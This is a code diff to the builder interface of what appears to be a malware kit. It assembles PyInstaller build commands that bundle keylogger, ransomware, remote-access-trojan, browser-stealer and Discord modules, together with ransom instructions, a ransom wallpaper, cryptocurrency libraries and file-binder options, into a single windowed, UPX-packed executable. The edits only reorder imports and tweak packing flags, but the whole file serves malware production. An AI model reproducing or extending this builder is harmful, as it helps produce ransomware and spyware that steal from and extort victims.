@@ -458,7 +458,6 @@ class App(customtkinter.CTk):
             '--hidden-import','win32con',
             '--hidden-import','win32ui', 
             '--hidden-import','marshal',
-            '--hidden-import','sqlite3',
             '--hidden-import','random',  
             '--hidden-import','winreg',
             '--hidden-import','base64',
@@ -475,7 +474,6 @@ class App(customtkinter.CTk):
             '--hidden-import','math',
             '--hidden-import','mss',
             '--hidden-import','sys',
-            '--hidden-import','cv2',
             '--hidden-import','wmi',
             '--hidden-import','ssl',
             '--hidden-import','re',
@@ -501,6 +499,7 @@ class App(customtkinter.CTk):
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
             '--hidden-import', 'pyaudio'
+            '--hidden-import','cv2',
         ] if rat_client else []
 
         browser_imports = [
@@ -519,7 +518,7 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--windowed', '--noconfirm', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
